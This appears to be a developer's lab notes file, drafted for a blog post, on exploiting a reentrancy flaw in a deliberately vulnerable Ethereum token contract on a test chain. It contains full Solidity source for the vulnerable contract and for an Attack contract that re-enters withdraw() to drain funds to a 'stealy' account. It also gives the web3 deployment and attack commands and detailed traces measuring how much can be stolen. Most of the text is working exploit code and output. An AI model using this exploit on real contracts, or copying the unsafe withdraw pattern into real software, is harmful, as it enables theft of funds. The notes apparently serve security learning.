# Notes


Transfering from one account to another

```
eth.sendTransaction({ from: <from address>',
                      to: <to address>,
                      value: <number of wei>
                    })
```

# Accounts

coinbase address:     0xc96aaa54e2d44c299564da76e1cd3184a2386b8d
coinbase private key: 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef

user address:         0x5f80f153589d71c91e5937fbee2a198b43be581e
user private key:     0xcafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe

stealy address:       0x7057d488a44a3795993412a6c00deac60907f78c
stealy private key:   0x57ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea157ea

# Trace

    var weiInEther = 1000000000000000000;
    var weiInSzabo = 1000000000000;
    var creator  = web3.eth.accounts[0];
    var stealy   = web3.eth.accounts[1];

    var szaboOf = function(address) { return web3.fromWei(web3.eth.getBalance(address), "szabo"); };

    personal.unlockAccount(creator,  "test", 10000); // for many hours
    personal.unlockAccount(stealy,   "test", 10000); // for many hours


    // Let Stealy have a little bit of ether to play around with
    var txSendAttackerFunds = web3.eth.sendTransaction({from: creator, to: stealy, value: (10*weiInSzabo) });

    var contractNotifier = function(e, contract){
        if(!e) {

          if(!contract.address) {
            console.log("Contract transaction send: TransactionHash: " + contract.transactionHash + " waiting to be mined...");

          } else {
            console.log("Contract mined! Address: " + contract.address);
            console.log(contract);
          }

        } else {
          console.log(e);
        }
    };

    var twiSource = 'contract TokenWithInvariants {         event Log(string msg ,address from, address to, uint value);         mapping(address => uint) public balanceOf;         uint public totalSupply;         /* 1 token = 1 szabo */         uint public conversion = 1 szabo;          modifier checkInvariants {  _ if (false) throw;         }          /* intentionally vulnerable */         function deposit(uint amount) checkInvariants {           Log("deposit", msg.sender, 0x0, amount);           /* Throw if not enough value has been sent to "buy" token */           if (msg.value / conversion < amount) throw;           balanceOf[msg.sender] += amount;           totalSupply += amount;         }          function transfer(address to, uint value) checkInvariants {           Log("transfer", msg.sender, to, value);           if (balanceOf[msg.sender] >= value) {             balanceOf[to] += value;             balanceOf[msg.sender] -= value;           }         }          /* intentionally vulnerable */         function withdraw() checkInvariants {           uint balance = balanceOf[msg.sender];           Log("withdraw", 0x0, msg.sender, balance);           if (msg.sender.call.value(balance*conversion)()) {             totalSupply -= balance;             balanceOf[msg.sender] = 0;           }         }       }';



    var twiCompiled = web3.eth.compile.solidity(twiSource);
    var twiContract = web3.eth.contract(twiCompiled.TokenWithInvariants.info.abiDefinition);

    var twi = twiContract.new({from: creator, data: twiCompiled.TokenWithInvariants.code, gas: 1000000, gasPrice: 1}, contractNotifier);

Wait for mining

    var twiLogEvent = twi.Log({_from: creator});
    twiLogEvent.watch(function(err, result) {
      var a = result.args;
      if (err) { console.log(err); return; }
      console.log(a.msg, a.from, a.to, a.value);
    });

    // Send some ether to the token contract from creator
    twi.deposit(1000, { from: creator,  gas: 1000000, gasPrice: 1, value: (1000*weiInSzabo)});

Getting ready for our attack run

    // Now compile the attack contract

    var attackSource =  '/* The proxy contract is required to declare an interface    that Attack understands */ contract TWIProxy {   event Log(string msg ,address from, address to, uint value);   mapping(address => uint) public balanceOf;   uint public totalSupply;    function transfer(address to, uint value) {   }    function deposit(uint amount) {   }    function withdraw() {   }  }   contract Attack {   event AttackLog(string msg, uint value);   bool performAttack = false;   uint8 depth = 0;   uint constant conversion = 1 szabo;   uint recursions = 1;   /* fill in with address of TokenWithInvariants contract */   TWIProxy twi;   address stealAddress;   uint8 numTokens;    /* Constructor */   function Attack(address _contractAddress, address _stealAddress, uint8 _numTokens, uint _recursions) {     twi = TWIProxy(_contractAddress);     stealAddress = _stealAddress;     numTokens    = _numTokens;     recursions   = _recursions;   }    /* Default function. Always run */   function() {     if (performAttack) {       AttackLog("Increasing depth", depth + 1);       depth = depth + 1;       AttackLog("Transfer tokens to other address", numTokens);       AttackLog("Current szabos", (uint8)(this.balance/conversion));       AttackLog("Current tokens", twi.balanceOf(this));       if (depth < 2) {  /* attack again */         AttackLog("Recursively attacking", 99);         /* Transfer tokens to another address */         twi.transfer.value(numTokens*conversion)(stealAddress,numTokens);         AttackLog("stealy balance after", twi.balanceOf(stealAddress));         twi.withdraw();       } else {         AttackLog("Attack over", 99);         performAttack = false; /* turn off attack again*/       }     }   }    function reset() {     performAttack = false;   }    function attack() {     depth = 0;     performAttack = true;     /* Contract itself must have some funds */     twi.deposit.value(numTokens*conversion)(numTokens);     twi.withdraw();   }  }';



    var attackCompiled = web3.eth.compile.solidity(attackSource);
    var attackContract = web3.eth.contract(attackCompiled.Attack.info.abiDefinition);

    // steal two tokens each time to a recursion depth of 5
    var amountToSteal = 2;

    var attack = attackContract.new(twi.address, stealy, amountToSteal, 3, { from: creator, data: attackCompiled.Attack.code, gas: 1000000, gasPrice: 1}, contractNotifier)

Wait for mining

    var attackLogEvent = attack.AttackLog();
    attackLogEvent.watch(function(err, result) {
      var a = result.args;
      if (err) { console.log(err); return; }
      console.log(a.msg, a.value);
    });


    // Give an initial amount
    web3.eth.sendTransaction({from: stealy, to: attack.address, value: amountToSteal*weiInSzabo, gas: 1000000, gasPrice: 1 })


    // Check previous state
    console.log("TWI total supply:", twi.totalSupply(), "balanceOf(attack):", twi.balanceOf(attack.address), "balanceOf(stealy):", twi.balanceOf(stealy));
    console.log("TWI value:", szaboOf(twi.address), "attack value:", szaboOf(attack.address), "stealy value:", szaboOf(stealy));

    // Now we are ready for the attack

    attack.attack({ from: stealy, gas: 10000000, gasPrice: 1})

Wait until finished

    console.log("TWI total supply:", twi.totalSupply(), "balanceOf(attack):", twi.balanceOf(attack.address), "balanceOf(stealy):", twi.balanceOf(stealy));
    console.log("TWI value:", szaboOf(twi.address), "attack value:", szaboOf(attack.address), "stealy value:", szaboOf(stealy));

# Oddities

Consider this:

    twi.deposit(1, { from: attacker, gasPrice: 1 })

The last argument is a bit odd. The deposit function has only one parameter yet I have given it two.
It seems that all methods accept an extra argument where you can add a hash with a "from" address
and other options too. Be sure to set a low gasPrice!

I haven't yet found the Ethereum documentation that tells you this.

`eth.getStorageAt` is great, but if you want to be able to use it properly then you need to read
this: http://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage


# Open mystery


SHA3 hashes are different for web3.sha3 and Solidity. I don't know why.

Solidity:

     SHA3(000000000000000000000000c96aaa54e2d44c299564da76e1cd3184a2386b8d) = bffc6a0b3a5962d974bf2aa352cab76f811201252c0b157f76aa2afbadba93dd

Web3

    web3.sha3(bffc6a0b3a5962d974bf2aa352cab76f811201252c0b157f76aa2afbadba93dd) = 0x6d9540cc0e26bbc57d15ec4aef2eccbd06c24ae73a9f3ef727cda2cb758255a1



# Blog post notes


- You need to send value along with a "deposit" call. Exchange rate is 1 token = 1 szabo. Otherwise
  the transaction fails.


Failed trace:

  value    | totalSupply |A.val|  A  | S
-----------+-------------+-----+-----+-----
  1000        1000          2     0     0        A: twi.deposit.value(2)(2)
  1002        1000          0     0     0          TWI: balanceOf[A] += amount
  1002        1000          0     2     0          TWI: totalSupply += amount
  1002        1002          0     2     0          TWI: checkInvariants()
  1002        1002          0     2     0        A: twi.withdraw
  1002        1002          0     2     0          TWI: balance = balanceOf[A]    (== 2)
  1002        1002          0     2     0          TWI: A.call.value(balance)()
  1000        1002          2     2     0            A: twi.transfer.value(2)(stealy, 2)
  1002        1002          0     2     0              TWI: balanceOf[S] += value;
  1002        1002          0     2     2              TWI: balanceOf[A] -= value;
  1002        1002          0     0     2              TWI: checkInvariants()
  1002        1002          0     0     2            A: twi.withdraw()
  1002        1002          0     0     2              TWI: balance = balanceOf[A]  (== 0)
  1002        1002          0     0     2              TWI: A.call.value(balance)()
  1000        1002          0     0     2                A: return
  1000        1002          0     0     2              TWI: totalSupply -= balance (does nothing)
  1000        1002          0     0     2              TWI: balanceOf[A] = 0 (does nothing)
  1000        1002          0     0     2            A: return
  1000        1002          0     0     2          TWI: totalSupply -= balance
  1000        1000          0     0     2          TWI: balanceOf[A] = 0 (does nothing)
  1000        1000          0     0     2

A has been drained of value but stealy has tokens


Shorthand

value       = ether balance of contract in szabos
totalSupply = uint variable of TWI contract
A.val       = ether balance of A in szabos
A           = balanceOf[attack.address]
S           = balanceOf[stealy]


  value    | totalSupply |A.val|  A  | S | Ops                 | Trace
-----------+-------------+-----+-----+---+---------------------+-------------------------------------
  1000        1000          2     0    0  [value+2,A.val-2]    | A: twi.deposit.value(2)(2)
  1002        1000          0     0    0  [A+2]                |   TWI: balanceOf[A] += amount
  1002        1000          0     2    0  [totalSupply+2]      |   TWI: totalSupply += amount
  1002        1002          0     2    0  []                   |   TWI: checkInvariants() // suceeds
  1002        1002          0     2    0  []                   | A: twi.withdraw
  1002        1002          0     2    0  []                   |   TWI: balance = balanceOf[A]    (== 2)
  1002        1002          0     2    0  [value-2,A.val+2]    |   TWI: A.call.value(balance)()
  1000        1002          2     2    0  []                   |     A: twi.withdraw()
  1000        1002          2     2    0  []                   |       TWI: balance = balanceOf[A]  (==2)
  1000        1002          2     2    0  [value-2,A.val+2]    |       TWI: A.call.value(balance)()
   998        1002          4     2    0  [value+4,A.val-4]    |         A: twi.transfer.value(4)(stealy, 2)
  1002        1002          0     2    0  [S+2]                |           TWI: balanceOf[S] += value
  1002        1002          0     2    2  [A-2]                |           TWI: balanceOf[A] -= value
  1002        1002          0     0    2  []                   |           TWI: checkInvariants() // suceeds
  1002        1002          0     0    2  []                   |         A: return
  1002        1002          0     0    2  [totalSupply-2]      |       TWI: totalSupply -= balance
  1002        1000          0     0    2  [A=0]                |       TWI: balanceOf[A] = 0 (does nothing)
  1002        1000          0     0    2  []                   |       TWI: checkInvariants
  1002        1000          0     0    2  [totalSupply-2]      |   TWI: totalSupply -= balance
  1002         998          0     0    2  [A=0]                |   TWI: balanceOf[A] = 0 (does nothing)
  1002         998          0     0    2  []                   |   TWI: checkInvariants  // succeeds
  1002         998          0     0    2

This is just the beginning. Now we need to perform a "race to empty" using S as a contract.


value    | totalSupply |S.val|  S | Ops                    | Trace
---------+-------------+-----+----+------------------------+-------------------
 1002         998         0     2    []                    | S: twi.withdraw()
 1002         998         0     2    []                    |   TWI: balance = balanceOf[S]    // balance == 2
 1002         998         0     2    [value-2, S.val+2]    |   TWI: S.call.value(balance)()
 1000         998         2     2    []                    |     S: twi.withdraw()
 1000         998         2     2    []                    |       TWI: balance = balanceOf[S] // balance = 2
 1000         998         2     2    [value-2, S.val+2]    |       TWI: A.call.value(balance)()
  998         998         4     2    []                    |         S: return
  998         998         4     2    [totalSupply-2]       |       TWI: totalSupply -= balance
  998         996         4     2    [S = 0]               |       TWI: balanceOf[S] = 0
  998         996         4     0    []                    |       TWI: checkInvariants()  // succeeds
  998         996         4     0    []                    |     S: return
  998         996         4     0    [totalSupply-2]       |   TWI: totalSupply -= balance
  998         994         4     0    [S=0]                 |   TWI: balanceOf[S] = 0  // does nothing
  998         994         4     0    []                    |   TWI: checkInvariants // succeeds
  998         994         4     0

This is nice, but I wonder if you could recursively call this many, many times and just keep
getting value out...


value    | totalSupply |S.val|  S | Ops                    | Trace
---------+-------------+-----+----+------------------------+-------------------
 1002         998         0     2    []                    | S: twi.withdraw()
 1002         998         0     2    []                    |   TWI: balance = balanceOf[S]    // balance == 2
 1002         998         0     2    [value-2, S.val+2]    |   TWI: S.call.value(balance)()
 1000         998         2     2    []                    |     S: twi.withdraw()
 1000         998         2     2    []                    |       TWI: balance = balanceOf[S] // balance = 2
 1000         998         2     2    [value-2, S.val+2]    |       TWI: S.call.value(balance)()
  998         998         4     2    []                    |         S: twi.withdraw()
  998         998         4     2    []                    |           TWI: balance = balanceOf[S] // balance = 2
  998         998         4     2    [value-2, S.val+2]    |           TWI: S.call.value(balance)()
  996         998         6     2    []                    |             S: return
  996         998         6     2    [totalSupply-2]       |           TWI: totalSupply -= balance
  996         996         6     2    [S=0]                 |           TWI: balanceOf[S] = 0
  996         996         6     0    []                    |           TWI: checkInvariants() // succeeds... JUST (wouldn't succeed if you did another recursive call)
... rest omitted ...




The answer is no. The maximum withdraw is triple.

Is a short original attack possible?


  value    | totalSupply |A.val|  A  | S | Ops                 | Trace
-----------+-------------+-----+-----+---+---------------------+-------------------------------------
  1000        1000          2     0    0  [value+2,A.val-2]    | A: twi.deposit.value(2)(2)
  1002        1000          0     0    0  [A+2]                |   TWI: balanceOf[A] += amount
  1002        1000          0     2    0  [totalSupply+2]      |   TWI: totalSupply += amount
  1002        1002          0     2    0  []                   |   TWI: checkInvariants() // suceeds
  1002        1002          0     2    0  []                   | A: twi.withdraw
  1002        1002          0     2    0  []                   |   TWI: balance = balanceOf[A]    (== 2)
  1002        1002          0     2    0  [value-2,A.val+2]    |   TWI: A.call.value(balance)()
  1000        1002          2     2    0  [value+2]            |     A.transfer.value(2)(stealy,2)
  1002        1002          0     2    0  [S+2]                |       TWI: balanceOf[S] += value
  1002        1002          0     2    2  [A-2]                |       TWI: balanceOf[A] -= value
  1002        1002          0     0    2  []                   |       TWI: checkInvariants() // succeeds
  1002        1002          0     0    2  []                   |     A: return
  1002        1002          0     0    2  [totalSupply-2]      |   TWI: totalSupply -= balance
  1002        1000          0     0    2  [A=0]                |   TWI: balanceOf[A] = 0 // does nothing
  1002        1000          0     0    2  []                   |   TWI: checkInvariants // succeeds
  1002        1000          0     0    2

Hmmm, not nearly as good but it still works. Should allow a double withdraw.

Using all this data I'd like to make the following conjecture:

    number of withdraws possible = total withdraw calls + 1

Let's look at 3 withdraw calls before transfer

  value    | totalSupply |A.val|  A  | S | Ops                 | Trace
-----------+-------------+-----+-----+---+---------------------+-------------------------------------
  1000        1000          2     0    0  [value+2,A.val-2]    | A: twi.deposit.value(2)(2)
  1002        1000          0     0    0  [A+2]                |   TWI: balanceOf[A] += amount
  1002        1000          0     2    0  [totalSupply+2]      |   TWI: totalSupply += amount
  1002        1002          0     2    0  []                   |   TWI: checkInvariants() // suceeds
  1002        1002          0     2    0  []                   | A: twi.withdraw
  1002        1002          0     2    0  []                   |   TWI: balance = balanceOf[A]    // == 2
  1002        1002          0     2    0  [value-2,A.val+2]    |   TWI: A.call.value(balance)()
  1000        1002          2     2    0  []                   |     A: twi.withdraw()
  1000        1002          2     2    0  []                   |       TWI: balance = balanceOf[A]  // ==2
  1000        1002          2     2    0  [value-2,A.val+2]    |       TWI: A.call.value(balance)()
   998        1002          4     2    0  []                   |         A: twi.withdraw()
   998        1002          4     2    0  []                   |           TWI: balance = balanceOf[A] // == 2
   998        1002          4     2    0  [value-2,A.val+2]    |           TWI: A.call.value(balance)()
   996        1002          6     2    0  [value+6]            |             A.transfer.value(6).stealy(2)
  1002        1002          0     2    0  [S+2]                |               TWI: balanceOf[S] += value
  1002        1002          0     2    2  [A-2]                |               TWI: balanceOf[A] -= value
  1002        1002          0     0    2  []                   |               TWI: checkInvariants() // succeeds
  1002        1002          0     0    2  []                   |             A: return
  1002        1002          0     0    2  [totalSupply-2]      |           TWI: totalSupply -= balance
  1002        1000          0     0    2  [A=0]                |           TWI: balanceOf[A] = 0 // does nothing
  1002        1000          0     0    2  []                   |           TWI: checkInvariants() // succeeds
  1002        1000          0     0    2  []                   |         A: return
  1002        1000          0     0    2  [totalSupply-2]      |       TWI: totalSupply -= balance
  1002         998          0     0    2  [A=0]                |       TWI: balanceOf[A] = 0 // does nothing
  1002         998          0     0    2  []                   |       TWI: checkInvariants() // succeeds
  1002         998          0     0    2  []                   |     A: return
  1002         998          0     0    2  [totalSupply-2]      |   TWI: totalSupply -= balance
  1002         996          0     0    2  [A=0]                |   TWI: balanceOf[A] = 0 // does nothing
  1002         996          0     0    2  []                   |   TWI: checkInvariants() // succeeds
  1002         996          0     0    2

The differential between totalSupply and value is now even larger, allowing us to withdraw 4
times using the S contract!


## Lessons learned

- You thought there was a gas bug when things weren't working. You thought that perhaps
  log messages used too much gas. This was not the case. It was the invariant checking that
  threw you off

- Doing traces like in the original github code base is the way to go when trying to exploit.


